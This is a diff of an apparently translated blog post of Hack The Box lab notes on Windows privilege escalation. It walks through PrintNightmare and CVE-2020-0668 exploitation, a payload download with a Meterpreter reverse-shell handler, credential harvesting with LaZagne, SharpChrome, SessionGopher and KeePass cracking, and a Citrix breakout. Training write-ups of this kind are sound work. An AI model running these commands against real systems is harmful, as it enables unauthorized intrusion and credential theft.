-<ul><li>Exploiting print spooler service vulnerabilities</li><li>Directly add a local administrator user, or execute a malicious DLL</li><li>Then switch to the high-privilege context</li></ul>
+<ul><li>Exploit the Print Spooler service vulnerability.</li><li>Add a local administrator user directly, or execute a malicious DLL.</li><li>Switch into the elevated context afterward.</li></ul>
 <ol><li><strong>CVE-2020-0668 + Mozilla Maintenance Service</strong></li></ol>
-<ul><li>Exploit arbitrary file movement vulnerabilities to put malicious programs you can control into the SYSTEM service path</li><li>Start the service and get the SYSTEM shell</li></ul>
+<ul><li>Abuse an arbitrary file move vulnerability.</li><li>Place an attacker-controlled executable in a <code>SYSTEM</code> service path.</li><li>Start the service to obtain a <code>SYSTEM</code> shell.</li></ul>
+
+
+
+
+
+
+
+
 <h3>1. Print Nightmare</h3>
 <h4>First check whether the Spooler print background service is turned on</h4>
 <p>In target machine PowerShell:</p>
 <pre><code>ls \\localhost\pipe\spoolss</code></pre>
-<p>If you see<code>spoolss</code>, indicating that the printing service is running and you can continue.</p>
+<p>If you see <code>spoolss</code>, indicating that the printing service is running and you can continue.</p>
 <hr/>
 <h4>Bypass execution policy</h4>
 <pre><code class="language-PowerShell">Set-ExecutionPolicy Bypass -Scope Process</code></pre>
-<p>input<code>A</code> Confirm.</p>
+<p>input <code>A</code> Confirm.</p>
 <hr/>
 <h4>Import the script and add the admin user</h4>
-<p>Assume that the question environment has already given<code>CVE-2021-1675.ps1</code>, execute:</p>
+<p>Assume that the question environment has already given <code>CVE-2021-1675.ps1</code>, execute:</p>
 <pre><code class="language-PowerShell">Import-Module C:\Tools\CVE-2021-1675.ps1 Invoke-Nightmare -NewUser "hacker" -NewPassword "Pwnd1234!" -DriverName "PrintIt"</code></pre>
 <p>When successful, you will generally see something like:</p>
 <ul><li>created payload</li></ul>
@@ -4974,7 +4982,7 @@ wget http://&lt;VPN_IP&gt;:8080/maintenanceservice.exe -O C:\Users\htb-student\D
 <p>Why two copies? Because the first copy will be "corrupted" during the exploit process, the second copy is a backup clean version.</p>
 <hr/>
 <h4>Running CVE-2020-0668</h4>
-<p>Assume the exploit is in<code>C:\Tools\CVE-2020-0668\</code>: </p>
+<p>Assume the exploit is in <code>C:\Tools\CVE-2020-0668\</code>: </p>
 <pre><code class="language-cmd">C:\Tools\CVE-2020-0668\CVE-2020-0668.exe C:\Users\htb-student\Desktop\maintenanceservice.exe "C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"</code></pre>
 <p>If the output contains:</p>
 <ul><li><code>Moving...</code></li></ul>
@@ -4994,7 +5002,7 @@ wget http://&lt;VPN_IP&gt;:8080/maintenanceservice.exe -O C:\Users\htb-student\D
 <pre><code class="language-cmd">copy /Y C:\Users\htb-student\Desktop\maintenanceservice2.exe "C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"</code></pre>
 <hr/>
 <h4>Start the Metasploit handler on the attacker machine</h4>
-<p>Write one first<code>handler.rc</code>: </p>
+<p>Write one first <code>handler.rc</code>: </p>
 <pre><code>use exploit/multi/handler
 set PAYLOAD windows/x64/meterpreter/reverse_https
 set LHOST &lt;VPN_IP&gt;
@@ -5029,7 +5037,7 @@ type C:\Users\Administrator\Desktop\flag.txt</code></pre>
 <p>Against best practices, applications often store passwords in clear text configuration files. Suppose we get command execution in the context of an unprivileged user account. In this case, we may be able to find credentials for their administrator account or other privileged local or domain account. we can use<a href="https://ss64.com/nt/findstr.html" rel="noreferrer" target="_blank">findstr</a> Tools to search for this sensitive information.</p>
 <ol><li><strong>Application configuration file</strong></li></ol>
 <pre><code>PS C:\htb&gt; findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml</code></pre>
-<p>Sensitive IIS information, such as credentials, may be stored in<code>web.config</code> in the file. For the default IIS website, this address might be in<code>C: \inetpub\wwwroot\web.config</code>, but the file may have multiple versions in different locations, which we can search for recursively.</p>
+<p>Sensitive IIS information, such as credentials, may be stored in <code>web.config</code> in the file. For the default IIS website, this address might be in <code>C: \inetpub\wwwroot\web.config</code>, but the file may have multiple versions in different locations, which we can search for recursively.</p>
 <ol><li><strong>dictionary file</strong></li></ol>
 <p>Another interesting example is dictionary files. For example, sensitive information such as passwords may be entered into email clients or browser-based applications that underline unrecognized words. Users can add these words to the dictionary to avoid distracting red underlines.</p>
 <pre><code class="language-PowerShell">PS C:\htb&gt; gc 'C:\Users\htb-student\AppData\Local\Google\Chrome\User Data\Default\Custom Dictionary.txt' | Select-String password 
@@ -5062,7 +5070,7 @@ Password1234!</code></pre>
 <pre><code>PS C:\htb&gt; (Get-PSReadLineOption).HistorySavePath
 
 C:\Users\htb-student\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt</code></pre>
-<p>Once we know the location of the file (the default path is above) we can try using<code>gc</code> Read its contents.</p>
+<p>Once we know the location of the file (the default path is above) we can try using <code>gc</code> Read its contents.</p>
 <ul><li>Read the PowerShell history file</li></ul>
 <pre><code class="language-PowerShell">PS C:\htb&gt; gc (Get-PSReadLineOption).HistorySavePath 
 dir 
@@ -5090,13 +5098,13 @@ Get-IISsite -Server WEB02 -web "Default Web Site"
 wevtutil qe Application "/q:*[Application [(EventID=3005)]]" /f:text /rd:true /u:WEB02\administrator /p:5erv3rAdmin! /r:WEB02</code></pre>
 <p>Credentials are often used in scripting and automation tasks to conveniently store encrypted credentials. Credentials passed<a href="https://en.wikipedia.org/wiki/Data_Protection_API" rel="noreferrer" target="_blank">DPAPI</a> Protection, usually means that only the same user on the same computer that created them can decrypt them.</p>
 <ol><li><strong>PowerShell credentials</strong></li></ol>
-<p>For example, the following script<code>Connect-VC.ps1</code>, a system administrator created it to facilitate connection to vCenter Server.</p>
+<p>For example, the following script <code>Connect-VC.ps1</code>, a system administrator created it to facilitate connection to vCenter Server.</p>
 <pre><code># Connect-VC.ps1
 # Get-Credential | Export-Clixml -Path 'C:\scripts\pass.xml'
 $encryptedPassword = Import-Clixml -Path 'C:\scripts\pass.xml'
 $decryptedPassword = $encryptedPassword.GetNetworkCredential().Password
 Connect-VIServer -Server 'VC-01' -User 'bob_adm' -Password $decryptedPassword</code></pre>
-<p>Decrypting PowerShell Credentials If we gain command execution in the background of this user, or are able to abuse DPAPI, then we can<code>encrypted.xml</code> Recover clear text credentials. The examples below assume the former.</p>
+<p>Decrypting PowerShell Credentials If we gain command execution in the background of this user, or are able to abuse DPAPI, then we can <code>encrypted.xml</code> Recover clear text credentials. The examples below assume the former.</p>
 <pre><code>PS C:\htb&gt; $credential = Import-Clixml -Path 'C:\scripts\pass.xml'
 PS C:\htb&gt; $credential.GetNetworkCredential().username
 
@@ -5175,9 +5183,9 @@ Mode                 LastWriteTime         Length Name
 -a----         5/25/2021  11:59 AM           4096 plum.sqlite
 -a----         5/25/2021  11:59 AM          32768 plum.sqlite-shm
 -a----         5/25/2021  12:00 PM         197792 plum.sqlite-wal</code></pre>
-<p>We can put three<code>plum.sqlite*</code> Copy the file to the system, open it with SQLite tools such as DB browser, and query<code>select Text from Note;</code> View the Note table<code>Text</code> columns.</p>
+<p>We can put three <code>plum.sqlite*</code> Copy the file to the system, open it with SQLite tools such as DB browser, and query <code>select Text from Note;</code> View the Note table <code>Text</code> columns.</p>
 <img alt="Pasted image 20260322052414" src="assets/posts/windows-privilege-escalation/Pasted image 20260322052414.png"/>
-<p><strong>View note data using PowerShell</strong> This can also be done using the PSSQLite module for PowerShell. First, import the module, point to a data source (here refers to the SQLite database file used by the StickNotes application), and finally query<code>Note</code> table, looking for any interesting data. This can also be downloaded on our attacker machine<code>.sqlite</code> Completed after the file, or remotely via WinRM.</p>
+<p><strong>View note data using PowerShell</strong> This can also be done using the PSSQLite module for PowerShell. First, import the module, point to a data source (here refers to the SQLite database file used by the StickNotes application), and finally query <code>Note</code> table, looking for any interesting data. This can also be downloaded on our attacker machine <code>.sqlite</code> Completed after the file, or remotely via WinRM.</p>
 <pre><code class="language-PowerShell">PS C:\htb&gt; Set-ExecutionPolicy Bypass -Scope Process
 
 Execution Policy Change
@@ -5197,7 +5205,7 @@ Text
 \id=e4adae4c-a40b-48b4-93a5-900247852f96
 \id=1a44a631-6fff-4961-a4df-27898e9e1e65 root:Vc3nt3R_adm1n!
 \id=c450fc5f-dc51-4412-b4ac-321fd41c522a Thycotic demo tomorrow at 10am</code></pre>
-<p><strong>String used to view the contents of the database file</strong> We can also copy them to the attack box with<code>string</code>The command searches the data, which may be less efficient depending on the database size.</p>
+<p><strong>String used to view the contents of the database file</strong> We can also copy them to the attack box with <code>string</code> The command searches the data, which may be less efficient depending on the database size.</p>
 <pre><code class="language-PowerShell">Chenduoduo@htb[/htb]$  strings plum.sqlite-wal
 
 CREATE TABLE "Note" (
@@ -5263,7 +5271,7 @@ C:\Program Files\Windows PowerShell\*</code></pre>
     User: inlanefreight\bob</code></pre>
 <p>The saved credentials are used when we try to RDP access to the host.</p>
 <img alt="Pasted image 20260322055123" src="assets/posts/windows-privilege-escalation/Pasted image 20260322055123.png"/>
-<p>We can also try using<code>runas</code> Reuse the credentials to send a reverse shell as that user, run the binary, or launch a PowerShell or CMD console with:</p>
+<p>We can also try using <code>runas</code> Reuse the credentials to send a reverse shell as that user, run the binary, or launch a PowerShell or CMD console with:</p>
 <p>Execute commands as other users</p>
 <pre><code>PS C:\htb&gt; runas /savecred /user:inlanefreight\bob "COMMAND HERE"</code></pre>
 <p>Get saved credentials from Chrome Users often store credentials in their browser for applications they frequently access. We can use something like<a href="https://github.com/GhostPack/SharpDPAPI" rel="noreferrer" target="_blank">SharpChrome</a> Tools like this get cookies and saved login information from Google Chrome.</p>
@@ -5291,10 +5299,10 @@ C:\Program Files\Windows PowerShell\*</code></pre>
 
 file_path,signon_realm,origin_url,date_created,times_used,username,password
 C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Login Data,https://vc01.inlanefreight.local/,https://vc01.inlanefreight.local/ui,4/12/2021 5:16:52 PM,13262735812597100,bob@inlanefreight.local,Welcome1</code></pre>
-<p>Note: Chromium-based browsers collecting credentials often generate additional events that blue teams can log and identify, such as<code>4688</code>(process creation) and<code>16385</code>(DPAPI activity); defenders may also consider file system/object access events such as<code>4662</code>(object access) and<code>4663</code>(file access) to improve detection accuracy.</p>
-<p>Many companies offer password managers to users. This can be a desktop application such as<code>KeePass</code>, cloud solutions such as<code>1Password</code>, or an enterprise password library such as<code>Thycotic</code> or<code>CyberArk</code>. Gaining access to a password manager, especially one used by IT staff or an entire department, can lead to administrator-level access to high-value targets such as network devices, servers, databases, etc. We may gain access to the password vault through password reuse or guessing weak/common passwords. Some password managers such as<code>KeePass</code>, stored locally on the host. If we find it on a server, workstation or file share.<code>kdbx</code> file, you will know that what we are facing is<code>KeePass</code> Databases are usually protected only by a master password. If we can download to the attack host<code>.kdbx</code> file, you can use<a href="https://gist.githubusercontent.com/HarmJ0y/116fa1b559372804877e604d7d367bbc/raw/c0c6f45ad89310e61ec0363a69913e966fe17633/keepass2john.py" rel="noreferrer" target="_blank">keepass2john</a> Tools such as this extract password hashes and use password cracking tools such as<a href="https://github.com/hashcat" rel="noreferrer" target="_blank">Hashcat</a> or<a href="https://github.com/openwall/john" rel="noreferrer" target="_blank">John the Ripper</a> for processing.</p>
+<p>Note: Chromium-based browsers collecting credentials often generate additional events that blue teams can log and identify, such as <code>4688</code>(process creation) and <code>16385</code>(DPAPI activity); defenders may also consider file system/object access events such as <code>4662</code>(object access) and <code>4663</code>(file access) to improve detection accuracy.</p>
+<p>Many companies offer password managers to users. This can be a desktop application such as <code>KeePass</code>, cloud solutions such as <code>1Password</code>, or an enterprise password library such as <code>Thycotic</code> or <code>CyberArk</code>. Gaining access to a password manager, especially one used by IT staff or an entire department, can lead to administrator-level access to high-value targets such as network devices, servers, databases, etc. We may gain access to the password vault through password reuse or guessing weak/common passwords. Some password managers such as <code>KeePass</code>, stored locally on the host. If we find it on a server, workstation or file share.<code>kdbx</code> file, you will know that what we are facing is <code>KeePass</code> Databases are usually protected only by a master password. If we can download to the attack host <code>.kdbx</code> file, you can use<a href="https://gist.githubusercontent.com/HarmJ0y/116fa1b559372804877e604d7d367bbc/raw/c0c6f45ad89310e61ec0363a69913e966fe17633/keepass2john.py" rel="noreferrer" target="_blank">keepass2john</a> Tools such as this extract password hashes and use password cracking tools such as<a href="https://github.com/hashcat" rel="noreferrer" target="_blank">Hashcat</a> or<a href="https://github.com/openwall/john" rel="noreferrer" target="_blank">John the Ripper</a> for processing.</p>
 <ol><li><strong>Password Managers Password Managers</strong></li></ol>
-<p>Extracting the KeePass hash First, we use<code>keepass2john.py</code> The script extracts the hash value in Hashcat format.</p>
+<p>Extracting the KeePass hash First, we use <code>keepass2john.py</code> The script extracts the hash value in Hashcat format.</p>
 <pre><code>Chenduoduo@htb[/htb]$ python2.7 keepass2john.py ILFREIGHT_Help_Desk.kdbx ILFREIGHT_Help_Desk:$keepass$*2*60000*222*f49632ef7dae20e5a670bdec2365d5820ca1718877889f44e2c4c202c62f5fd5*2e8b53e1b11a2af306eb8ac424110c63029e03745d3465cf2e03086bc6f483d0*7df525a2b843990840b249324d55b6ce*75e830162befb17324d6be83853dbeb309ee38475e9fb42c1f809176e9bdf8b8*63fdb1c4fb1dac9cb404bd15b0259c19ec71a8b32f91b2aaaaf032740a39c154</code></pre>
 <p>Cracking the Hash Offline We can then feed the hash into Hashcat, KeePass has a hash pattern of 13400. If successful, we may obtain a large number of credentials that can be used to access other applications/systems, or even network devices, servers, databases, etc., provided we have access to the password database used by IT personnel.</p>
 <pre><code>Chenduoduo@htb[/htb]$ hashcat -m 13400 keepass_hash /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt
@@ -5333,7 +5341,7 @@ Stopped: Fri Aug  6 11:18:11 2021</code></pre>
 <ol><li><strong>Email</strong></li></ol>
 <p>When all else fails we can run<a href="https://github.com/AlessandroZ/LaZagne" rel="noreferrer" target="_blank">LaZagne</a> Tools that try to obtain credentials from various software. Such software includes web browsers, chat clients, databases, email, memory dumps, various system management tools, and internal password storage mechanisms (such as Autologon, Credman, DPAPI, LSA secrets, etc.). The tool can be used to run all modules, specific modules (like databases), or against specific software (like OpenVPN). The output can be saved as a standard text file or in JSON format. Let's give it a try.</p>
 <ol><li>More about credentials</li></ol>
-<p>We can check with<code>-h</code> Flag help menu.</p>
+<p>We can check with <code>-h</code> Flag help menu.</p>
 <ul><li>View the LaZagne Help Menu</li></ul>
 <pre><code>PS C:\htb&gt;.\lazagne.exe -h
 
@@ -5370,7 +5378,7 @@ positional arguments:
 optional arguments:
   -h, --help            show this help message and exit
   -version              laZagne version</code></pre>
-<p>Running all LaZagne modules As we can see, we have many modules to choose from. run<code>the tool</code>Afterwards, supported applications are searched and the cleartext credentials found are returned. As the example below shows, many applications do not store credentials securely (and it is best never to store credentials!). They can be easily retrieved and used to escalate privileges locally, migrate to other systems, or access sensitive data.</p>
+<p>Running all LaZagne modules As we can see, we have many modules to choose from. run <code>the tool</code> Afterwards, supported applications are searched and the cleartext credentials found are returned. As the example below shows, many applications do not store credentials securely (and it is best never to store credentials!). They can be easily retrieved and used to escalate privileges locally, migrate to other systems, or access sensitive data.</p>
 <pre><code>PS C:\htb&gt;.\lazagne.exe all
 
 |====================================================================|
@@ -5403,9 +5411,9 @@ Password:! Q A Z z a q 1
 For more information launch it again with the -v option
 
 elapsed time = 5.50499987602</code></pre>
-<p>we can use<a href="https://github.com/Arvanaghi/SessionGopher" rel="noreferrer" target="_blank">SessionGopher</a> Extract saved PuTTY, WinSCP, FileZilla, SuperPuTTY and RDP credentials. Written in PowerShell, the tool is capable of searching and decrypting stored login information for remote access tools. It can be run locally or remotely. it will search<code>HKEY_USERS</code> Hive searches for all users logged into a domain-joined (or standalone) host and searches for and decrypts any saved session information. It can also be used to search PuTTY private key files (.ppk), Remote Desktop (.rdp) and RSA (.sdtid) files.</p>
+<p>we can use<a href="https://github.com/Arvanaghi/SessionGopher" rel="noreferrer" target="_blank">SessionGopher</a> Extract saved PuTTY, WinSCP, FileZilla, SuperPuTTY and RDP credentials. Written in PowerShell, the tool is capable of searching and decrypting stored login information for remote access tools. It can be run locally or remotely. it will search <code>HKEY_USERS</code> Hive searches for all users logged into a domain-joined (or standalone) host and searches for and decrypts any saved session information. It can also be used to search PuTTY private key files (.ppk), Remote Desktop (.rdp) and RSA (.sdtid) files.</p>
 <ol><li>Further credentials</li></ol>
-<p>To run SessionGopher as the current user we need local administrator rights to obtain<code>HKEY_USERS</code> Session information is stored for each user in, but it's always worth running it as the current user to see if you can find any useful credentials.</p>
+<p>To run SessionGopher as the current user we need local administrator rights to obtain <code>HKEY_USERS</code> Session information is stored for each user in, but it's always worth running it as the current user to see if you can find any useful credentials.</p>
 <pre><code>PS C:\htb&gt; Import-Module.\SessionGopher.ps1
  
 PS C:\Tools&gt; Invoke-SessionGopher -Target WINLPE-SRV01
@@ -5446,11 +5454,11 @@ ExtraArgs:
 Port: 22
 Putty Session: Default Settings
 </code></pre>
-<p>Certain programs and Windows configurations can cause clear text passwords or other data to be stored in the registry. Although<code>Lazagne</code> and<code>SessionGopher</code> Tools such as Tools are a great way to extract credentials, but as penetration testers we should also be familiar and familiar with manually enumerating credentials.</p>
+<p>Certain programs and Windows configurations can cause clear text passwords or other data to be stored in the registry. Although <code>Lazagne</code> and <code>SessionGopher</code> Tools such as Tools are a great way to extract credentials, but as penetration testers we should also be familiar and familiar with manually enumerating credentials.</p>
 <ol><li>Clear text password storage in the registry</li></ol>
 <p>Windows <a href="https://learn.microsoft.com/en-us/troubleshoot/windows-server/user-profiles-and-logon/turn-on-automatic-logon" rel="noreferrer" target="_blank">Autologon</a> Is a feature that allows users to configure their Windows operating system to automatically log in to a specific user account, eliminating the need to manually enter a username and password each time it is started. However, once configured, the username and password are stored in the registry in clear text. This feature is typically used on single-user systems or when convenience outweighs security needs.</p>
 <ul><li>Windows AutoLogon</li></ul>
-<p>Registry keys related to Autologon can be found at Hive's<code>HKEY_LOCAL_MACHINE</code> Found in, standard users have access to:</p>
+<p>Registry keys related to Autologon can be found at Hive's <code>HKEY_LOCAL_MACHINE</code> Found in, standard users have access to:</p>
 <pre><code class="language-cmd">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows 
 NT\CurrentVersion\Winlogon</code></pre>
 <p>Typical configuration of an account involves manually setting the following registry keys:</p>
@@ -5475,7 +5483,7 @@ HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
 <p>For Putty sessions that use a proxy connection, the credentials are stored in clear text in the registry after the session is saved.</p>
 <ol><li><strong>Putty</strong></li></ol>
 <pre><code>Computer\HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\&lt;SESSION NAME&gt;</code></pre>
-<p>Note that access control for this registry key is tied to the user account that configured and saved the session. So to view that account we need to log in as that user and search<code>HKEY_CURRENT_USER</code> beehive. Then, if we have administrator rights, we can<code>HKEY_USERS</code> Find it in the corresponding user's hive.</p>
+<p>Note that access control for this registry key is tied to the user account that configured and saved the session. So to view that account we need to log in as that user and search <code>HKEY_CURRENT_USER</code> beehive. Then, if we have administrator rights, we can <code>HKEY_USERS</code> Find it in the corresponding user's hive.</p>
 <p>First, we need to enumerate the available save sessions:</p>
 <ul><li>List the number of meetings and search for qualifications:</li></ul>
 <pre><code>PS C:\htb&gt; reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions
@@ -5517,7 +5525,7 @@ User profiles
     All User Profile: EE_Guest
     All User Profile: EE_Guest 2.4
     All User Profile: ilfreight_corp</code></pre>
-<p>Depending on the network configuration we can obtain the pre-shared key (see below<code>key</code>content) and potentially access the target network. Although rare, we may encounter this situation during an engagement and use these accesses to jump to another wireless network with more resources.</p>
+<p>Depending on the network configuration we can obtain the pre-shared key (see below <code>key</code> content) and potentially access the target network. Although rare, we may encounter this situation during an engagement and use these accesses to jump to another wireless network with more resources.</p>
 <ul><li>Get saved wireless passwords</li></ul>
 <pre><code>C:\htb&gt; netsh wlan show profile ilfreight_corp key=clear
 
@@ -5565,13 +5573,13 @@ Cost settings
 <h2>Citrix Restricted Environment Breakthrough</h2>
 <p>Many organizations leverage virtualization platforms such as Terminal Services, Citrix, AWS AppStream, CyberArk PSM, and kiosks to provide remote access solutions to meet their business needs. However, in most organizations, desktop environments implement "lockdown" measures to minimize the potential impact of malicious employees and compromised accounts on overall domain security. While these desktop restrictions may hinder threat actors, it is still possible for them to "break out" of the restricted environment.</p>
 <p>Breakout basic method:</p>
-<p>enter<code>dialog box</code>.</p>
-<p>Use dialog box to achieve<code>command execution</code>.</p>
-<p><code>Escalate privileges</code>to gain a higher level of access.</p>
+<p>enter <code>dialog box</code>.</p>
+<p>Use dialog box to achieve <code>command execution</code>.</p>
+<p><code>Escalate privileges</code> to gain a higher level of access.</p>
 <ol><li>Gain access to a <code>Dialog Box</code>.</li><li>Exploit the Dialog Box to achieve <code>command execution</code>.</li><li><code>Escalate privileges</code> to gain higher levels of access.</li></ol>
-<p>In some environments where only minimal hardening is implemented, the Start menu may even have a standard shortcut for<code>cmd.exe</code>, which may help unauthorized access. However, in the highly restricted<code>blockade</code>environment, any attempt to look for "cmd.exe" or "PowerShell.exe" in the Start menu will yield no results. Likewise, access via File Explorer<code>C: \Windows\system32</code> An error is triggered that prevents direct access to critical system tools. Gaining CMD/Command Prompt access in such a restricted environment is a significant achievement as it provides extensive control over the operating system. This level of control allows attackers to collect valuable information and facilitate further escalation of privileges.</p>
+<p>In some environments where only minimal hardening is implemented, the Start menu may even have a standard shortcut for <code>cmd.exe</code>, which may help unauthorized access. However, in the highly restricted <code>blockade</code> environment, any attempt to look for "cmd.exe" or "PowerShell.exe" in the Start menu will yield no results. Likewise, access via File Explorer <code>C: \Windows\system32</code> An error is triggered that prevents direct access to critical system tools. Gaining CMD/Command Prompt access in such a restricted environment is a significant achievement as it provides extensive control over the operating system. This level of control allows attackers to collect valuable information and facilitate further escalation of privileges.</p>
 <p>There are many techniques you can use to break into Citrix environments. This section won't cover every possible scenario, but we will cover the most common Citrix grouping methods.</p>
-<p>Access using RDP session to build target<code>http://humongousretail.com/remote/</code>, and log in using the credentials provided below. After logging in, click<code>Default desktop</code>Get Citrix<code>launch.ica</code> file to connect to a restricted environment.</p>
+<p>Access using RDP session to build target <code>http://humongousretail.com/remote/</code>, and log in using the credentials provided below. After logging in, click <code>Default desktop</code> Get Citrix <code>launch.ica</code> file to connect to a restricted environment.</p>
 <pre><code>Username: pmorgan
 Password: Summer1Summer!
   Domain: htb.local
@@ -5582,15 +5590,15 @@ Get-RegistryKeyValue -Key 'HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer' -
 
 </code></pre>
 <h3>Bypass path restrictions</h3>
-<p>When we try to access using file explorer<code>C: \Users</code> when it is found that it is restricted and an error occurs. This indicates that Group Policy has been implemented to restrict users from browsing using File Explorer<code>C: \</code> directory on disk. In this case, Windows dialog boxes can be used to bypass the restrictions imposed by Group Policy. Once you get the Windows dialog box, the next step is usually to navigate to a folder path that contains local executables that provide interactive console access (ie: cmd.exe). Usually, we can access the file by directly entering the folder path in the file name field.</p>
+<p>When we try to access using file explorer <code>C: \Users</code> when it is found that it is restricted and an error occurs. This indicates that Group Policy has been implemented to restrict users from browsing using File Explorer <code>C: \</code> directory on disk. In this case, Windows dialog boxes can be used to bypass the restrictions imposed by Group Policy. Once you get the Windows dialog box, the next step is usually to navigate to a folder path that contains local executables that provide interactive console access (ie: cmd.exe). Usually, we can access the file by directly entering the folder path in the file name field.</p>
 <img alt="Pasted image 20260322063450" src="assets/posts/windows-privilege-escalation/Pasted image 20260322063450.png"/>
-<p>Many desktop applications deployed through Citrix have the ability to interact with operating system files. Functions such as Save, Save As, Open, Load, Browse, Import, Export, Help, Search, Scan, and Print often provide attackers with the opportunity to invoke Windows dialog boxes. In Windows, there are many ways to open a dialog box using tools such as Paint, Notepad, and WordPad. In this section we will use<code>MS Paint</code> For example.</p>
-<p>Run from start menu<code>painting</code>, click<code>"File &gt; Open</code> " to open the dialog box.</p>
+<p>Many desktop applications deployed through Citrix have the ability to interact with operating system files. Functions such as Save, Save As, Open, Load, Browse, Import, Export, Help, Search, Scan, and Print often provide attackers with the opportunity to invoke Windows dialog boxes. In Windows, there are many ways to open a dialog box using tools such as Paint, Notepad, and WordPad. In this section we will use <code>MS Paint</code> For example.</p>
+<p>Run from start menu <code>painting</code>, click <code>"File &gt; Open</code> " to open the dialog box.</p>
 <img alt="Pasted image 20260322063517" src="assets/posts/windows-privilege-escalation/Pasted image 20260322063517.png"/>
-<p>After opening the Windows Draw dialog box, we can enter in the file name field<a href="https://learn.microsoft.com/en-us/dotnet/standard/io/file-path-formats#unc-paths" rel="noreferrer" target="_blank">UNC</a> path<code>\\127.0.0.1\c$\users\pmorgan</code>, and set File-Type to<code>All files</code>, press Enter to access the desired directory.</p>
+<p>After opening the Windows Draw dialog box, we can enter in the file name field<a href="https://learn.microsoft.com/en-us/dotnet/standard/io/file-path-formats#unc-paths" rel="noreferrer" target="_blank">UNC</a> path <code>\\127.0.0.1\c$\users\pmorgan</code>, and set File-Type to <code>All files</code>, press Enter to access the desired directory.</p>
 <h3>Access SMB shares from a restricted environment</h3>
 <p>Due to the restrictions in place, File Explorer does not allow direct access to the SMB share on the attacker's machine, nor to the Ubuntu server hosting the Citrix environment. However, this limitation can be bypassed by using UNC paths in Windows dialog boxes. This method can be used to facilitate file transfer from another computer.</p>
-<p>Use Impacket<code>smbserver.py</code> The script starts the SMB server from the Ubuntu machine.</p>
+<p>Use Impacket <code>smbserver.py</code> The script starts the SMB server from the Ubuntu machine.</p>
 <pre><code>root@ubuntu:/home/htb-student/Tools# smbserver.py -smb2support share $(pwd)
 
 Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
@@ -5600,10 +5608,10 @@ Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
 [*] Config file parsed
 [*] Config file parsed
 [*] Config file parsed</code></pre>
-<p>Back in your Citrix environment, launch the Draw app through the Start menu. Enter the "File" menu, select "Open", and a prompt dialog box will appear. In this Paint-related Windows dialog box, enter the UNC path as<code>\\10.13.38.95\share</code>, enter the specified Filename field. Make sure the File Type parameter is set to "All Files". Press the "Enter" key to enter the share.</p>
-<p>Due to limitations within File Explorer, copying files directly is not feasible. However, another approach is to right<code>key click</code>executable files and then launch them. right click<code>pwn.exe</code> binary file and select<code>"Open</code> ", this should prompt us to run it and a command console will open.</p>
+<p>Back in your Citrix environment, launch the Draw app through the Start menu. Enter the "File" menu, select "Open", and a prompt dialog box will appear. In this Paint-related Windows dialog box, enter the UNC path as <code>\\10.13.38.95\share</code>, enter the specified Filename field. Make sure the File Type parameter is set to "All Files". Press the "Enter" key to enter the share.</p>
+<p>Due to limitations within File Explorer, copying files directly is not feasible. However, another approach is to right <code>key click</code> executable files and then launch them. right click <code>pwn.exe</code> binary file and select <code>"Open</code> ", this should prompt us to run it and a command console will open.</p>
 <img alt="Pasted image 20260322063739" src="assets/posts/windows-privilege-escalation/Pasted image 20260322063739.png"/>
-<p>Executable<code>pwn.exe</code> is from<code>pwn.c</code> File compiled custom binary that opens cmd when executed.</p>
+<p>Executable <code>pwn.exe</code> is from <code>pwn.c</code> File compiled custom binary that opens cmd when executed.</p>
 <pre><code class="language-c">#include &lt;stdlib.h&gt;
 int main() {
   system("C:\\Windows\\System32\\cmd.exe");
@@ -5611,36 +5619,36 @@ int main() {
 <p>We can then use the gained cmd permissions to copy the files from the SMB share to pmorgan's desktop directory.</p>
 <img alt="Pasted image 20260322063831" src="assets/posts/windows-privilege-escalation/Pasted image 20260322063831.png"/>
 <h3>Alternatives to Explorer</h3>
-<p>In cases where you impose severe restrictions on File Explorer, you can use something like<code>Q-Dir</code> or<code>Explorer++</code> Alternative file system editors like this serve as workarounds. These tools can bypass folder restrictions enforced by Group Policy, allowing users to browse and access files and directories that would be restricted in a standard File Explorer environment.</p>
-<p>It's worth noting that File Explorer was previously unable to copy files from SMB shares due to limitations. However, by utilizing<code>Explorer++</code>, the following screenshot has successfully demonstrated transferring files from<code>\\13.38.95\share</code> Location copied to belongs to user<code>pmorgan</code> Desktop features.</p>
+<p>In cases where you impose severe restrictions on File Explorer, you can use something like <code>Q-Dir</code> or <code>Explorer++</code> Alternative file system editors like this serve as workarounds. These tools can bypass folder restrictions enforced by Group Policy, allowing users to browse and access files and directories that would be restricted in a standard File Explorer environment.</p>
+<p>It's worth noting that File Explorer was previously unable to copy files from SMB shares due to limitations. However, by utilizing <code>Explorer++</code>, the following screenshot has successfully demonstrated transferring files from <code>\\13.38.95\share</code> Location copied to belongs to user <code>pmorgan</code> Desktop features.</p>
 <img alt="Pasted image 20260322063901" src="assets/posts/windows-privilege-escalation/Pasted image 20260322063901.png"/>
 <p>Due to its speed, user-friendly interface and portability,<a href="https://explorerplusplus.com/" rel="noreferrer" target="_blank">Explorer++</a> Highly recommended and often used for such occasions. As a portable application, it can be executed directly without installation, making it a convenient option for bypassing folder restrictions set by Group Policy.</p>
 <h3>Alternate registration editor</h3>
 <img alt="Pasted image 20260322063935" src="assets/posts/windows-privilege-escalation/Pasted image 20260322063935.png"/>
 <p>Likewise, when the default Registry Editor is blocked by Group Policy, an alternative Registry Editor can be used to bypass standard Group Policy restrictions.<a href="https://sourceforge.net/projects/simpregedit/" rel="noreferrer" target="_blank">Simpleregedit</a>、<a href="https://sourceforge.net/projects/uberregedit/" rel="noreferrer" target="_blank">Uberregedit</a> and<a href="https://sourceforge.net/projects/sre/" rel="noreferrer" target="_blank">SmallRegistryEditor</a> are examples of such GUI tools that facilitate editing the Windows registry without being blocked by Group Policy. These tools provide practical and effective solutions for managing registry settings and are suitable for such restricted environments.</p>
